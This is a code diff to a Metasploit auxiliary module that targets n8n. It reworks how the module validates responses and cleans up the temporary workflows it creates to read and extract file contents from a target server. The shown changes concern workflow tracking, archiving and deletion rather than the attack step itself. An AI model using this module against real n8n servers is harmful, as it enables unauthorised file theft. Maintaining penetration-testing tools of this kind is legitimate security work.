@@ -99,6 +99,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_file_upload_workflow
+    @workflow_id = nil
     @workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"
     random_uuid = SecureRandom.uuid.strip
     workflow_data = {
@@ -145,14 +146,18 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true,
       'data' => workflow_data.to_json
     )
-    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res.code == 201
+    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res && [200, 201].include?(res.code)
 
     json = res.get_json_document
-
-    @workflow_id = json.dig('data', 'id') || json['id']
-    nodes = json.dig('data', 'nodes')
-    version_id = json.dig('data', 'versionId')
-    id = json.dig('data', 'id')
+    data = json.is_a?(Hash) && json['data'].is_a?(Hash) ? json['data'] : {}
+    workflow_id = data['id'] || (json.is_a?(Hash) ? json['id'] : nil)
+    if workflow_id.is_a?(String) && workflow_id.match?(/\A[\w-]+\z/)
+      @workflow_id = workflow_id
+      (@owned_workflows ||= []) << { id: workflow_id.dup, origin: workflow_origin, cookies: cookie_jar.dup, archived: false }
+    end
+    nodes = data['nodes']
+    version_id = data['versionId']
+    id = data['id']
 
     fail_with(Failure::NotFound, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id
 
@@ -219,12 +224,13 @@ class MetasploitModule < Msf::Auxiliary
     run_id
   end
 
-  def archive_workflow
-    print_status("Cleaning up workflow #{@workflow_id}...")
+  def archive_workflow(workflow_id = @workflow_id, cookies: cookie_jar)
+    print_status("Cleaning up workflow #{workflow_id}...")
 
     res = send_request_cgi(
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'archive'),
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s, 'archive'),
+      'cookie' => cookies,
       'keep_cookies' => true
     )
 
@@ -232,7 +238,7 @@ class MetasploitModule < Msf::Auxiliary
 
     json_data = res.get_json_document
 
-    return false unless json_data.dig('data', 'id') == @workflow_id
+    return false unless json_data.is_a?(Hash) && json_data['data'].is_a?(Hash) && json_data['data']['id'] == workflow_id
 
     true
   end
@@ -241,17 +247,18 @@ class MetasploitModule < Msf::Auxiliary
     /\A[\w+\-.]+@[a-z\d-]+(\.[a-z\d-]+)*\.[a-z]+\z/i =~ username
   end
 
-  def delete_workflow
+  def delete_workflow(workflow_id = @workflow_id, cookies: cookie_jar)
     res = send_request_cgi(
       'method' => 'DELETE',
-      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s),
+      'cookie' => cookies
     )
 
     return false unless res&.code == 200
 
     json_data = res.get_json_document
 
-    return false unless json_data['data'] == true
+    return false unless json_data.is_a?(Hash) && json_data['data'] == true
 
     true
   end
@@ -297,22 +304,58 @@ class MetasploitModule < Msf::Auxiliary
 
     run_id = get_run_id
 
-    file_content = extract_content(run_id)
+    extract_content(run_id)
+  ensure
+    cleanup_workflows
+  end
 
-    if !archive_workflow
-      print_warning('Could not archive workflow, workflow might need to be archived and deleted manually')
-      return file_content
+  def cleanup_workflows
+    (@owned_workflows || []).dup.each do |workflow|
+      unless workflow[:origin] == workflow_origin
+        print_warning("Skipping cleanup of workflow #{workflow[:id]} because the n8n target has changed; archive and delete it manually.")
+        next
+      end
+
+      begin
+        unless workflow[:archived]
+          unless archive_workflow(workflow[:id], cookies: workflow[:cookies])
+            print_warning("Could not archive workflow #{workflow[:id]}; archive and delete it manually.")
+            next
+          end
+          workflow[:archived] = true
+        end
+        unless delete_workflow(workflow[:id], cookies: workflow[:cookies])
+          print_warning("Could not delete workflow #{workflow[:id]}; delete it manually.")
+          next
+        end
+
+        @owned_workflows.delete(workflow)
+        @workflow_id = nil if @workflow_id == workflow[:id]
+      rescue Rex::ConnectionError, Rex::TimeoutError => e
+        elog("Failed to clean up n8n workflow #{workflow[:id]}", error: e)
+        print_warning("Could not clean up workflow #{workflow[:id]}; archive and delete it manually.")
+      end
     end
+  end
 
-    if !delete_workflow
-      print_warning('Could not deleted workflow, workflow might need to be deleted manually')
-      return file_content
+  def cleanup
+    cleanup_workflows
+  ensure
+    super
+  end
+
+  def workflow_origin
+    [rhost, rport, ssl, vhost, target_uri.to_s, datastore['Proxies']].map do |value|
+      value.is_a?(String) ? value.dup : value
     end
-
-    file_content
   end
 
   def run
+    # Ownership belongs to one authenticated run. Failed cleanup reports exact
+    # IDs for manual follow-up rather than reusing them with later credentials.
+    @owned_workflows = []
+    @workflow_id = nil
+    @workflow_name = nil
     fail_with(Failure::BadConfig, 'Username should be valid email') unless valid_username?(datastore['USERNAME'])
     fail_with(Failure::NoAccess, 'Failed to login') unless login
 
